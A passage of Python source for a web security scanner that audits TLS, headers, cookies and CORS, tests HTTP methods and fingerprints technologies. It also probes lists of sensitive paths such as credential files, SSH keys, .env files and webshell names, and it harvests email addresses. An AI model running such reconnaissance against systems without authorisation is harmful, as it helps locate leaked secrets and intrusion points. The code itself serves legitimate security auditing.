    """Does the live certificate cover this hostname?"""
    if not cert_info:
        return None
    names = [s.lower() for s in (cert_info.get("san") or [])]
    cn = (cert_info.get("cn") or "").lower()
    if cn:
        names.append(cn)
    if not names:
        return None
    h = (host or "").lower()
    for n in names:
        if n == h:
            return True
        if n.startswith("*.") and (h == n[2:] or h.endswith("." + n[2:])):
            return True
    return False

def tls_alpn(host, port, timeout=8):
    """Real ALPN negotiation to detect HTTP/2 support."""
    ctx = _client_ctx()
    try:
        ctx.set_alpn_protocols(["h2", "http/1.1"])
    except NotImplementedError:
        return None, "ALPN not supported by this Python build"
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                proto = ss.selected_alpn_protocol()
                if not proto:
                    return None, "server selected no ALPN protocol (HTTP/2 not offered)"
                return proto, None
    except ssl.SSLError as e:
        reason = getattr(e, "reason", None) or str(e) or e.__class__.__name__
        return None, f"ALPN handshake failed: {reason}"
    except Exception as e:
        return None, f"ALPN probe error: {e}"

def ssl_details(host, port=443, timeout=8):
    """Live TLS handshake, certificate inspection and chain verification."""
    out = {"port": port, "tls": None, "cipher": None, "issuer": None, "subject": None,
           "cn": None, "not_before": None, "not_after": None, "days_left": None,
           "san": [], "connected": False, "trusted": None, "self_signed": None,
           "expired": None, "hostname_match": None, "verify_error": "", "covers_host": None}
    ctx = _client_ctx()
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                out["tls"] = ss.version()
                cipher = ss.cipher()
                out["cipher"] = cipher[0] if cipher else None
                der = ss.getpeercert(binary_form=True)
        out["connected"] = True
    except Exception as e:
        out["error"] = str(e)
        return out

    try:
        dec = _decode_cert(der)
        if dec is None:
            out["cert_note"] = "certificate details unavailable on this Python build"
        else:
            out["issuer"] = _flat_rdn(dec.get("issuer"))
            out["subject"] = _flat_rdn(dec.get("subject"))
            out["cn"] = _first_cn(dec.get("subject"))
            out["not_after"] = dec.get("notAfter")
            out["not_before"] = dec.get("notBefore")
            out["san"] = [v for k, v in dec.get("subjectAltName", ()) if k == "DNS"]
            na = _cert_date(dec.get("notAfter"))
            if na:
                out["days_left"] = (na - datetime.datetime.now()).days
                out["expired"] = out["days_left"] <= 0
            out["self_signed"] = bool(out["subject"]) and out["issuer"] == out["subject"]
            out["covers_host"] = cert_covers_host({"san": out["san"], "cn": out["cn"]}, host)
    except Exception as e:
        out["error"] = str(e)

    try:
        vctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with vctx.wrap_socket(sock, server_hostname=host):
                out["trusted"] = True
    except ssl.SSLCertVerificationError as e:
        out["trusted"] = False
        out["verify_error"] = str(e)
    except Exception as e:
        out["trusted"] = None
        out["verify_error"] = str(e)
    return out

def hsts_preload_status(host, timeout=12):
    """Real hstspreload.org API lookup."""
    url = f"https://hstspreload.org/api/v2/status?domain={quote(host)}"
    r = http_request(url, timeout=timeout, headers={"Accept": "application/json"})
    if not r.get("ok") or r.get("status") != 200:
        return None, f"HTTP {r.get('status')}"
    try:
        data = json.loads(r.get("body") or "{}")
    except Exception as e:
        return None, f"invalid JSON: {e}"
    return {"status": data.get("status"), "policy": data.get("policy")}, None

# ================= [7] HTTP HEADER AUDIT =================
HEADER_CHECKS = [
    ("strict-transport-security", "HSTS"),
    ("content-security-policy", "CSP"),
    ("x-frame-options", "clickjacking"),
    ("x-content-type-options", "MIME sniffing"),
    ("referrer-policy", "referrer leak"),
    ("permissions-policy", "feature access"),
    ("cross-origin-opener-policy", "COOP"),
    ("cross-origin-embedder-policy", "COEP"),
    ("cross-origin-resource-policy", "CORP"),
]

def _split_cookie_attrs(raw):
    """Split a single Set-Cookie value into (name, value, attrs dict)."""
    parts = [p.strip() for p in (raw or "").split(";") if p.strip()]
    if not parts:
        return None
    if "=" in parts[0]:
        name, value = parts[0].split("=", 1)
    else:
        name, value = parts[0], ""
    name = name.strip()
    value = value.strip()
    attrs = {}
    for p in parts[1:]:
        if "=" in p:
            k, v = p.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[p.strip().lower()] = True
    return name, value, attrs

def parse_cookies(set_cookie_headers):
    """Parse every real Set-Cookie header into rich records."""
    if isinstance(set_cookie_headers, str):
        set_cookie_headers = [set_cookie_headers] if set_cookie_headers.strip() else []
    if not set_cookie_headers:
        return []
    out = []
    for raw in set_cookie_headers:
        parsed = _split_cookie_attrs(raw)
        if not parsed:
            continue
        name, value, attrs = parsed
        if not name:
            continue
        out.append({
            "name": name,
            "value": value[:80],
            "domain": attrs.get("domain"),
            "path": attrs.get("path", "/"),
            "expires": attrs.get("expires"),
            "max_age": attrs.get("max-age") or attrs.get("maxage"),
            "secure": "secure" in attrs,
            "httponly": "httponly" in attrs,
            "samesite": (attrs.get("samesite") or "").lower() or None,
            "priority": attrs.get("priority"),
            "partitioned": "partitioned" in attrs,
            "raw": raw,
        })
    return out

def header_audit(resp, origin_probe=None):
    """Audit security headers, cookies and CORS of the live response."""
    headers = resp.get("headers") or {}
    present, missing, weak = [], [], []

    for h, desc in HEADER_CHECKS:
        if h in headers:
            present.append((h, headers[h]))
        else:
            missing.append((h, desc))

    if "strict-transport-security" in headers:
        val = headers["strict-transport-security"]
        m = re.search(r"max-age\s*=\s*(\d+)", val, re.I)
        if m and int(m.group(1)) < 15552000:
            weak.append(("strict-transport-security", f"max-age={m.group(1)} (below 180 days)"))
    if "content-security-policy" in headers:
        val = headers["content-security-policy"].lower()
        if "unsafe-inline" in val or "unsafe-eval" in val:
            weak.append(("content-security-policy", "contains unsafe-inline/unsafe-eval"))
    if headers.get("x-frame-options", "").upper() == "ALLOWALL":
        weak.append(("x-frame-options", "ALLOWALL"))

    # real CORS probe with an attacker style Origin
    acao = (headers.get("access-control-allow-origin") or "").strip()
    acac = (headers.get("access-control-allow-credentials") or "").strip().lower()
    cors_bad = (acao == "*" and acac == "true")
    if cors_bad:
        weak.append(("access-control-allow-origin", "wildcard '*' together with credentials"))
    if origin_probe:
        po = (origin_probe.get("headers") or {}).get("access-control-allow-origin", "")
        if po == "*":
            cors_bad = True
            weak.append(("access-control-allow-origin",
                         "echoed back '*' for a foreign Origin header"))

    cookies = parse_cookies(resp.get("set_cookie_list", []))
    return {"present": present, "missing": missing, "weak": weak, "cookies": cookies,
            "cors_misconfigured": cors_bad, "acao": acao, "origin_probe": origin_probe}

# ================= [8] HTTP METHODS TESTER =================
def test_http_methods(url, host, port, timeout=8):
    """Real OPTIONS / HEAD / TRACE / PUT / DELETE / PATCH / CONNECT requests."""
    results = []
    allow_header = None
    for method in ("OPTIONS", "HEAD", "TRACE", "PUT", "DELETE", "PATCH"):
        data = b"reconx-probe" if method in ("PUT", "PATCH") else None
        r = http_request(url, method=method, timeout=timeout, data=data)
        entry = {"method": method, "status": r.get("status", 0),
                 "ok": bool(r.get("ok")), "error": r.get("error", ""),
                 "allowed": None, "body": shorten(r.get("body") or "", 80)}
        if method == "OPTIONS":
            allow_header = (r.get("headers") or {}).get("allow")
            entry["allowed"] = allow_header
        results.append(entry)

    connect = raw_request(host, port,
                          f"CONNECT {host}:443 HTTP/1.1\r\nHost: {host}\r\n\r\n".encode(),
                          timeout=min(timeout, 6))
    m = re.match(r"HTTP/\d(?:\.\d)?\s+(\d{3})", connect)
    results.append({"method": "CONNECT", "status": int(m.group(1)) if m else 0,
                    "ok": bool(m), "error": "" if m else connect[:60],
                    "allowed": None, "body": shorten(connect, 80)})
    return {"methods": results, "allow": allow_header}

# ================= [9] REDIRECT CHAIN TRACER =================
def trace_redirects(url, max_hops=10, timeout=8):
    """Follow the real redirect chain hop by hop."""
    chain = []
    current = url
    seen = set([url])
    note = "stable"
    for hop in range(1, max_hops + 1):
        r = http_request(current, allow_redirects=False, timeout=timeout)
        status = r.get("status", 0)
        loc = (r.get("headers") or {}).get("location")
        chain.append({"hop": hop, "url": current, "status": status,
                      "location": loc, "error": r.get("error", "")})
        if status == 0:
            note = f"not measured - {shorten(r.get('error') or 'no response', 90)}"
            break
        if status in (301, 302, 303, 307, 308) and loc:
            nxt = urljoin(current, loc)
            if nxt in seen:
                note = f"redirect loop detected at hop {hop}"
                chain.append({"hop": hop + 1, "url": nxt, "status": 0, "location": "LOOP"})
                break
            seen.add(nxt)
            current = nxt
        else:
            break
    else:
        note = f"max hops ({max_hops}) reached"
    return {"chain": chain, "note": note, "final_url": current}

# ================= [10] TECHNOLOGY FINGERPRINTING =================
TECH_SIGS = [
    ("Nginx",           r"server:\s*nginx"),
    ("Apache",          r"server:\s*apache"),
    ("IIS",             r"server:\s*microsoft-iis"),
    ("LiteSpeed",       r"server:\s*litespeed"),
    ("Caddy",           r"server:\s*caddy"),
    ("OpenResty",       r"server:\s*openresty"),
    ("Zeus",            r"server:\s*zeus"),
    ("Jetty",           r"server:\s*jetty"),
    ("Tomcat",          r"server:\s*apache-coyote|tomcat"),
    ("gunicorn",        r"server:\s*gunicorn"),
    ("Cloudflare CDN",  r"cdn-cgi|cloudflare"),
    ("Fastly",          r"fastly|x-fastly"),
    ("Akamai",          r"akamai"),
    ("PHP",             r"x-powered-by:\s*php|php/\d"),
    ("ASP.NET",         r"x-aspnet-version|asp\.net|__viewstate"),
    ("Express",         r"x-powered-by:\s*express"),
    ("Next.js",         r"__next_data__|/_next/static"),
    ("Nuxt.js",         r"__nuxt__|/_nuxt/"),
    ("Django",          r"csrfmiddlewaretoken|server:\s*django"),
    ("Laravel",         r"laravel_session|x-powered-by:\s*laravel"),
    ("Ruby on Rails",   r"x-powered-by:\s*rails|csrf-param|data-remote"),
    ("Flask",           r"server:\s*werkzeug"),
    ("FastAPI",         r"x-powered-by:\s*fastapi|/docs.*swagger"),
    ("Symfony",         r"x-powered-by:\s*symfony|sf2"),
    ("WordPress",       r"wp-content|wp-includes|wp-json"),
    ("Drupal",          r"x-generator:\s*drupal|sites/(default|all)/"),
    ("Joomla",          r"x-generator:\s*joomla|/media/jui/"),
    ("Magento",         r"x-magento|mage/cookies"),
    ("Shopify",         r"x-shopid|cdn\.shopify\.com"),
    ("Ghost",           r"ghost-url|content=\"ghost"),
    ("Strapi",          r"strapi"),
    ("React",           r"data-reactroot|__react|react(-dom)?\.js"),
    ("Vue.js",          r"vue(\.min)?\.js|__vue__|data-v-[0-9a-f]{8}"),
    ("Angular",         r"ng-version|ng-app|angular(\.min)?\.js"),
    ("Svelte",          r"svelte-[0-9a-z]{6}|__svelte"),
    ("SvelteKit",       r"__sveltekit"),
    ("jQuery",          r"jquery[.\-]"),
    ("Bootstrap",       r"bootstrap(\.min)?\.(css|js)"),
    ("Tailwind CSS",    r"tailwind"),
    ("Font Awesome",    r"font-?awesome"),
    ("Google Tag Manager", r"googletagmanager\.com/gtm\.js|gtm\.start|gtag\("),
    ("Google Analytics",r"google-analytics\.com|ga\('create'"),
    ("Facebook Pixel",  r"connect\.facebook\.net|fbq\("),
    ("Hotjar",          r"static\.hotjar\.com|hjsiteSettings"),
    ("Sentry",          r"sentry\.io|raven\.js"),
    ("reCAPTCHA",       r"recaptcha"),
    ("Cloudflare R2",   r"r2\.dev"),
    ("Stripe",          r"js\.stripe\.com"),
    ("Cloudflare Turnstile", r"challenges\.cloudflare\.com"),
]

def detect_tech(resp):
    """Fingerprint technologies from the live response."""
    headers = resp.get("headers") or {}
    body = resp.get("body") or ""
    haystack = (" ".join(f"{k}: {v}" for k, v in headers.items()) + "\n" + body).lower()
    hits = []
    for name, pattern in TECH_SIGS:
        m = re.search(pattern, haystack, re.I)
        if m:
            hits.append({"name": name, "match": shorten(m.group(0), 60)})
    return hits

# ================= [11] HIDDEN PATHS SCANNER =================
PATHS_STD = [
    ("/robots.txt", "robots.txt", False),
    ("/sitemap.xml", "sitemap", False),
    ("/.well-known/security.txt", "security.txt", False),
    ("/login", "login page", False),
    ("/wp-login.php", "WordPress login", False),
    ("/admin", "admin panel", True),
    ("/administrator", "admin panel", True),
    ("/server-status", "Apache status", True),
    ("/phpinfo.php", "phpinfo", True),
    ("/.env", "env file", True),
    ("/.git/HEAD", "git metadata", True),
    ("/.git/config", "git config", True),
    ("/.DS_Store", "macOS metadata", True),
    ("/backup.zip", "backup archive", True),
    ("/config.php.bak", "config backup", True),
    ("/wp-config.php.bak", "WordPress config", True),
    ("/dump.sql", "SQL dump", True),
    ("/swagger-ui.html", "API docs", False),
    ("/swagger-ui/", "API docs", False),
    ("/api-docs", "API docs", False),
    ("/graphql", "GraphQL endpoint", False),
    ("/.htaccess", "htaccess", True),
    ("/web.config", "IIS config", True),
    ("/crossdomain.xml", "crossdomain policy", False),
    ("/elmah.axd", "elmah logs", True),
    ("/trace.axd", "trace logs", True),
    ("/server-info", "server info", True),
]
PATHS_DEEP = [
    ("/actuator", "Spring actuator", True),
    ("/actuator/env", "Spring env", True),
    ("/actuator/heapdump", "Spring heap dump", True),
    ("/.aws/credentials", "AWS creds", True),
    ("/.ssh/id_rsa", "SSH key", True),
    ("/.kube/config", "kubeconfig", True),
    ("/composer.json", "composer manifest", True),
    ("/composer.lock", "composer lock", True),
    ("/package.json", "npm manifest", True),
    ("/package-lock.json", "npm lock", True),
    ("/.gitignore", "gitignore", True),
    ("/Dockerfile", "dockerfile", True),
    ("/docker-compose.yml", "compose file", True),
    ("/.env.example", "env example", True),
    ("/.env.backup", "env backup", True),
    ("/info.php", "info file", True),
    ("/shell.php", "webshell", True),
    ("/c99.php", "webshell", True),
    ("/Telescope", "Telescope debug", True),
    ("/_debugbar/open", "Laravel debugbar", True),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "PHP eval-stdin", True),
    ("/cgi-bin/", "cgi-bin", True),
    ("/icons/", "icons dir", True),
]

def check_path(base, path, timeout=6):
    """Fetch one path and return its real status code."""
    root = base if base.endswith("/") else base + "/"
    url = urljoin(root, path.lstrip("/"))
    r = http_request(url, method="HEAD", timeout=timeout)
    if r.get("status", 0) in (0, 405, 501):
        r = http_request(url, method="GET", timeout=timeout)
    return {"path": path, "url": url, "status": r.get("status", 0), "ok": bool(r.get("ok"))}

def path_scan(base, paths, timeout=6, workers=10):
    """Scan a path list concurrently."""
    results = []
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = [pool.submit(check_path, base, p, timeout) for p, _l, _s in paths]
        for fut in as_completed(futures):
            try:
                results.append(fut.result())
            except Exception:
                pass
    results.sort(key=lambda x: x["path"])
    return results

# ================= [12] robots.txt PARSER =================
def fetch_robots(base, timeout=8):
    """Fetch and parse the real robots.txt."""
    root = base if base.endswith("/") else base + "/"
    url = urljoin(root, "robots.txt")
    r = http_request(url, timeout=timeout)
    if not r.get("ok") or r.get("status") != 200:
        return {"url": url, "status": r.get("status", 0), "found": False,
                "agents": [], "disallow": [], "allow": [], "sitemaps": [], "crawl_delay": None}
    text = r.get("body") or ""
    agents, disallow, allow, sitemaps = [], [], [], []
    crawl_delay = None
    for raw in text.splitlines():
        line = raw.split("#")[0].strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip().lower(), v.strip()
        if k == "user-agent":
            agents.append(v)
        elif k == "disallow":
            disallow.append(v)
        elif k == "allow":
            allow.append(v)
        elif k == "sitemap":
            sitemaps.append(v)
        elif k == "crawl-delay":
            crawl_delay = v
    return {"url": url, "status": r.get("status"), "found": True, "size": len(text),
            "agents": agents, "disallow": disallow, "allow": allow,
            "sitemaps": sitemaps, "crawl_delay": crawl_delay}

# ================= [13] sitemap.xml EXTRACTOR =================
def extract_sitemap(base, max_urls=100, timeout=10, depth=2):
    """Fetch sitemap.xml, follow nested sitemap indexes, extract real URLs."""
    root = base if base.endswith("/") else base + "/"
    start = urljoin(root, "sitemap.xml")
    urls, indexes, errors = [], [], []
    queue = [start]
    visited = set()
    while queue and len(urls) < max_urls and depth > 0:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)
        r = http_request(url, timeout=timeout)
        if not r.get("ok") or r.get("status") != 200:
            errors.append({"url": url, "status": r.get("status", 0)})
            continue
        try:
            root_el = ET.fromstring(r.get("body") or "")
        except Exception as e:
            errors.append({"url": url, "status": r.get("status"), "error": str(e)})
            continue
        is_index = root_el.tag.split("}")[-1].lower() == "sitemapindex"
        for el in root_el.iter():
            tag = el.tag.split("}")[-1].lower()
            if tag == "loc" and el.text:
                loc = el.text.strip()
                if is_index:
                    indexes.append(loc)
                    if len(queue) < 20:
                        queue.append(loc)
                else:
                    urls.append(loc)
        depth -= 1
    return {"start": start, "urls": urls[:max_urls], "total": len(urls),
            "indexes": indexes, "errors": errors}

# ================= [14] security.txt FETCHER =================
def fetch_security_txt(base, timeout=8):
    """Fetch /.well-known/security.txt and parse RFC 9116 fields."""
    root = base if base.endswith("/") else base + "/"
    url = urljoin(root, ".well-known/security.txt")
    r = http_request(url, timeout=timeout)
    out = {"url": url, "status": r.get("status", 0), "found": False,
           "contact": [], "expires": None, "encryption": [], "policy": None,
           "preferred_languages": [], "canonical": None, "acknowledgments": []}
    if not r.get("ok") or r.get("status") != 200:
        return out
    text = r.get("body") or ""
    out["found"] = True
    out["size"] = len(text)
    for raw in text.splitlines():
        line = raw.strip()
        if not line or ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip().lower(), v.strip()
        if k == "contact":
            out["contact"].append(v)
        elif k == "expires":
            out["expires"] = v
        elif k == "encryption":
            out["encryption"].append(v)
        elif k == "policy":
            out["policy"] = v
        elif k == "preferred-languages":
            out["preferred_languages"].append(v)
        elif k == "canonical":
            out["canonical"] = v
        elif k == "acknowledgments":
            out["acknowledgments"].append(v)
    return out

# ================= [15] EMAIL HARVESTING =================
EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
FALSE_EXT = (".png", ".jpg", ".jpeg", ".gif", ".css", ".js", ".svg", ".webp", ".ico",
             ".woff", ".woff2", ".ttf", ".mp4", ".mp3", ".json", ".xml", ".pdf")

def harvest_emails(texts):
    """Extract real e-mail addresses from page bodies and mailto: links."""
    found = set()
    for text in texts:
        if not text:
            continue
        for m in EMAIL_RE.finditer(text):
            mail = m.group(0).lower().strip(".")
            if mail.endswith(FALSE_EXT):
                continue
            if len(mail.split("@")[0]) < 2:
                continue
            found.add(mail)
    return sorted(found)

# ================= [16] IP GEOLOCATION + ASN =================
def geo_lookup(ip, timeout=8):
    """Real ip-api.com lookup for one IP.

    The free ip-api tier only answers over plain HTTP (HTTPS returns 403),
    so the request is made over HTTP and the answer is validated.
    """
    r = http_request(f"http://ip-api.com/json/{ip}", timeout=timeout)
    if not r.get("ok") or r.get("status") != 200:
        return {"ip": ip, "error": f"HTTP {r.get('status')} {r.get('error', '')}".strip()}
    try:
        d = json.loads(r.get("body") or "{}")
    except Exception as e:
        return {"ip": ip, "error": f"invalid JSON: {e}"}
    if d.get("status") != "success":
        return {"ip": ip, "error": d.get("message") or "lookup failed"}
    try:
        d = json.loads(r.get("body") or "{}")
    except Exception as e:
        return {"ip": ip, "error": f"invalid JSON: {e}"}
    return {"ip": ip, "country": d.get("country"), "country_code": d.get("countryCode"),
            "region": d.get("regionName"), "city": d.get("city"), "isp": d.get("isp"),
            "org": d.get("org"), "asn": d.get("as"), "asname": d.get("asname"),
            "timezone": d.get("timezone"), "lat": d.get("lat"), "lon": d.get("lon")}

# ================= [17] RATE LIMITING TEST =================
def rate_limit_test(url, count=10, timeout=8):
    """Fire N quick requests and measure the real server reaction."""
    times, statuses = [], []
    for _ in range(count):
        t0 = time.time()
        r = http_request(url, timeout=timeout)
        times.append(time.time() - t0)
        statuses.append(r.get("status", 0))
    first = sum(times[:3]) / 3 if len(times) >= 3 else times[0]
    last = sum(times[-3:]) / 3 if len(times) >= 3 else times[-1]
    ratio = (last / first) if first > 0 else 0.0
    limited = any(s == 429 for s in statuses)
    slowing = ratio >= 1.5
    return {"requests": count, "statuses": statuses,
            "avg_ms": round(sum(times) / len(times) * 1000, 1) if times else 0,
            "first_avg_ms": round(first * 1000, 1), "last_avg_ms": round(last * 1000, 1),
            "ratio": round(ratio, 2), "rate_limited": limited, "slowing_down": slowing}

# ================= [18] SECURITY SCORE ENGINE =================
GRADES = [(95, "A+"), (88, "A"), (82, "A-"), (76, "B+"), (70, "B"), (64, "B-"),
          (58, "C+"), (52, "C"), (45, "C-"), (38, "D+"), (30, "D"), (22, "D-"), (0, "F")]

def grade_for(pct):
    for limit, letter in GRADES:
        if pct >= limit:
            return letter
    return "F"

def compute_score(ctx):
    """Security score built only from checks that were really measured."""
    checks = []

    def add(label, weight, state, detail=""):
        checks.append({"label": label, "weight": weight,
                       "passed": None if state is None else bool(state), "detail": detail})

    http_ok = bool(ctx.get("http_ok"))
    url = ctx.get("url", "")
    hdrs = ctx.get("headers") or {}
    final_url = (ctx.get("http_meta") or {}).get("url") or url

    # HTTPS counts when the final served URL is https (redirects included)
    served_https = (final_url or url).lower().startswith("https://")
    add("HTTPS in use", 10, served_https if http_ok else False,
        shorten(final_url, 60) if http_ok else "target did not answer")
    add("HTTP redirects to HTTPS", 6, ctx.get("redirect_to_https"),
        ctx.get("redirect_detail", "") if http_ok else "not measured")

    for h, desc in HEADER_CHECKS:
        val = hdrs.get(h)
        weak = any(w[0] == h for w in (ctx.get("header_audit") or {}).get("weak", []))
        add(f"{h} ({desc})", 6 if h in ("strict-transport-security", "content-security-policy") else 3,
            (bool(val) and not weak) if http_ok else None,
            (shorten(val, 60) if val else "missing") if http_ok else "not measured")

    audit = ctx.get("header_audit") or {}
    cookies = audit.get("cookies") or []
    if cookies:
        hardened = all(c["secure"] and c["httponly"] and c["samesite"] for c in cookies)
        add("Cookies hardened", 6, hardened, f"{len(cookies)} cookie(s) audited")
    else:
        add("Cookies hardened", 6, None, "no cookies set")
    if http_ok:
        add("CORS not misconfigured", 6, not audit.get("cors_misconfigured"),
            "wildcard + credentials" if audit.get("cors_misconfigured") else "ok")

    ssl_i = ctx.get("ssl") or {}
    tls_ok = bool(ssl_i.get("connected"))
    days = ssl_i.get("days_left")
    add("Certificate trusted (system store)", 10, ssl_i.get("trusted") if tls_ok else None,
        ("verified" if ssl_i.get("trusted") is True
         else shorten(ssl_i.get("verify_error"), 60) if ssl_i.get("trusted") is False
         else "not measured"))
    add("Certificate not expired", 8,
        (days > 0) if (tls_ok and days is not None) else None,
        f"{days} day(s) left" if days is not None else "not measured")
    add("Certificate covers hostname", 6, ssl_i.get("covers_host") if tls_ok else None,
        ("covered" if ssl_i.get("covers_host") is True
         else "hostname NOT covered" if ssl_i.get("covers_host") is False else "not measured"))
    add("Certificate not self-signed", 4, (not ssl_i.get("self_signed")) if tls_ok else None,
        "self-signed" if ssl_i.get("self_signed") else "issuer != subject")

    versions = ctx.get("tls_versions") or {}
    if versions:
        modern = any(v.startswith("accepted") for k, v in versions.items()
                     if k in ("TLSv1.2", "TLSv1.3"))
        legacy = any(v.startswith("accepted") for k, v in versions.items()
                     if k in ("TLSv1", "TLSv1.1"))
        add("TLS 1.2 / 1.3 supported", 8, modern if modern or legacy else None,
            ", ".join(k for k, v in versions.items() if v.startswith("accepted")) or "none")
        add("No legacy TLS 1.0 / 1.1", 8, (not legacy) if (modern or legacy) else None,
            ", ".join(k for k, v in versions.items()
                      if k in ("TLSv1", "TLSv1.1") and v.startswith("accepted")) or "refused")
    alpn = ctx.get("alpn")
    if alpn is not None:
        add("ALPN negotiated", 3, bool(alpn), alpn)
    preload = ctx.get("hsts_preload")
    if preload and preload.get("status"):
        add("HSTS preload eligible", 4,
            preload.get("status") in ("preloaded", "pending"),
            str(preload.get("status")))

    risky = [p for p in ctx.get("open_ports", []) if p in RISKY_PORTS]
    if ctx.get("ports_scanned"):
        add("No risky ports exposed", 10, not risky,
            ",".join(f"{p}/{RISKY_PORTS[p]}" for p in risky) or "clean")
    exposed = ctx.get("exposed_paths", [])
    if ctx.get("paths_scanned"):
        add("No sensitive files exposed", 12, not exposed,
            ",".join(e["path"] for e in exposed) or "clean")

    methods = ctx.get("methods") or {}
    if methods:
        # a method is only "dangerous" when the server actually accepted it
        # (405 / 501 mean the method is refused -> that is a pass)
        unsafe = [m["method"] for m in methods.get("methods", [])
                  if m["method"] in ("TRACE", "PUT", "DELETE", "PATCH")
                  and 200 <= m.get("status", 0) < 300]
        add("Dangerous methods blocked", 8, not unsafe,
            ",".join(unsafe) if unsafe else "all refused")

    add("WAF / CDN protection", 5, bool(ctx.get("waf")) if http_ok else None,
        ", ".join(w["name"] for w in ctx.get("waf", [])) or ("none detected" if http_ok else "not measured"))

    server = hdrs.get("server", "")
    add("No server version leak", 5,
        (not re.search(r"\d", server)) if http_ok else None,
        server or ("none" if http_ok else "not measured"))

    axfr = ctx.get("zone_transfer")
    if axfr is not None:
        add("DNS zone transfer refused", 6, axfr is False, ctx.get("zone_transfer_note", ""))

    rl = ctx.get("rate_limit")
    if rl:
        add("Rate limiting enforced", 4, bool(rl.get("rate_limited")), 
            f"{rl.get('requests')} requests, avg {rl.get('avg_ms')}ms")

    measured = [c for c in checks if c["passed"] is not None]
    total = sum(c["weight"] for c in measured if c["passed"])
    max_total = sum(c["weight"] for c in measured)
    possible = sum(c["weight"] for c in checks)
    pct = int(round((total / max_total) * 100)) if max_total else 0
    return {"score": total, "max": max_total, "possible": possible, "percent": pct,
            "grade": grade_for(pct), "checks": checks}

# ================= MODULE RUNNERS =================
def run_dns(ctx, host, args):
    p_section("DNS Records", "1")
    ctx["modules_run"].append("dns")
    if is_ip(host):
        p_note("DNS", "target is an IP address - DNS records not applicable")
        ctx["dns"] = {"records": {}, "errors": {"_": "IP address"}, "resolver": "n/a"}
        ctx["dns_ips"] = [host]
        return
    data = dns_lookup(host)
    ctx["dns"] = data
    p_note("Resolver", data.get("resolver", "unknown"))
    for rtype in DNS_TYPES:
        vals = data.get("records", {}).get(rtype) or []
        if vals:
            p_ok(rtype, ", ".join(shorten(v, 80) for v in vals[:6]))
    for rtype, err in (data.get("errors") or {}).items():
        p_warn(rtype, err)
    for rtype in data.get("unsupported", []) or []:
        p_note(rtype, "not measured - dnspython not installed")

    ips = []
    for rtype in ("A", "AAAA"):
        ips.extend(data.get("records", {}).get(rtype) or [])
    ips = list(dict.fromkeys(ips))[:6]
    ctx["dns_ips"] = ips

    if ips:
        p_section("Reverse DNS (PTR)", "1b")
        for ip in ips:
            ptrs = reverse_dns(ip)
            p_ok(ip, ", ".join(ptrs) if ptrs else "no PTR record")

    axfr, axfr_note = dns_zone_transfer(host, timeout=min(5.0, args.timeout))
    ctx["zone_transfer"] = axfr
    ctx["zone_transfer_note"] = axfr_note
    if axfr is True:
        p_bad("Zone transfer", axfr_note)
    elif axfr is False:
        p_ok("Zone transfer", axfr_note)
    else:
        p_note("Zone transfer", f"not measured - {axfr_note}")

def run_rdap(ctx, host, args):
    p_section("WHOIS / RDAP", "2")
    ctx["modules_run"].append("rdap")
    data, err = rdap_lookup(host, timeout=max(12.0, args.timeout))
    source = "RDAP"
    if data is None:
        data, err2 = whois_command_lookup(host)
        source = "whois command"
        if data is None:
            p_note("RDAP", f"not measured - {err}")
            p_note("whois", f"not measured - {err2}")
            ctx["rdap"] = None
            return
        err = err2
    ctx["rdap"] = dict(data, source=source)
    p_note("Source", source)
    if data.get("registrar"):
        p_ok("Registrar", data["registrar"])
    if data.get("created"):
        p_ok("Created", data["created"])
    if data.get("updated"):
        p_ok("Updated", data["updated"])
    if data.get("expires"):
        p_ok("Expires", data["expires"])
    for st in (data.get("status") or [])[:8]:
        p_ok("Status", st)
    for ns in (data.get("nameservers") or [])[:8]:
        p_ok("Nameserver", ns)
    if not data.get("registrar") and not data.get("expires"):
        p_note("Data", "registry returned no parsable fields")

def probe_http_to_https(netloc, timeout=8):
    """Live check: does the plain-HTTP endpoint redirect to HTTPS?

    True  = it redirects to https
    False = it answers on http without redirecting
    None  = the plain-HTTP endpoint could not be reached at all
    """
    r = http_request(f"http://{netloc}", timeout=timeout, allow_redirects=False)
    if r.get("status", 0) == 0:
        return None, r.get("error", "connection failed")
    loc = (r.get("headers") or {}).get("location", "")
    if not loc:
        return False, f"HTTP {r.get('status')} without Location header"
    return loc.lower().startswith("https://"), f"HTTP {r.get('status')} -> {loc}"

def run_http(ctx, url, args):
    p_section("HTTP Response", "3")
    ctx["modules_run"].append("http")
    resp = http_request(url, timeout=args.timeout)
    http_ok = bool(resp.get("ok")) and resp.get("status", 0) > 0
    ctx["http_ok"] = http_ok
    ctx["http_status"] = resp.get("status", 0)
    ctx["http_resp"] = resp
    ctx["http_meta"] = {"status": resp.get("status"), "url": resp.get("url"),
                        "elapsed": resp.get("elapsed"), "error": resp.get("error"),
                        "size": len(resp.get("body") or "")}

    # live probe: does the plain HTTP endpoint force HTTPS ?
    parsed = urlparse(url)
    redir, redir_detail = probe_http_to_https(parsed.netloc, timeout=args.timeout)
    ctx["redirect_to_https"] = redir
    ctx["redirect_detail"] = redir_detail

    if not http_ok:
        p_bad("Request", shorten(resp.get("error") or "failed", 110))
        if redir is None:
            p_note("HTTP->HTTPS", f"not measured - {shorten(redir_detail, 90)}", C.Y)
        else:
            p_ok("HTTP->HTTPS", redir_detail, C.G if redir else C.Y)
        return
    p_ok("Status", resp.get("status"), C.G if resp.get("status", 0) < 400 else C.Y)
    p_ok("Final URL", resp.get("url"))
    p_ok("Response time", f"{resp.get('elapsed', 0) * 1000:.0f} ms")
    p_ok("Body size", f"{len(resp.get('body') or '')} bytes")
    hdrs = resp.get("headers") or {}
    for h in ("server", "x-powered-by", "content-type", "location", "set-cookie",
              "access-control-allow-origin", "strict-transport-security"):
        if h in hdrs:
            p_ok(h, shorten(hdrs[h], 80))
    if redir is None:
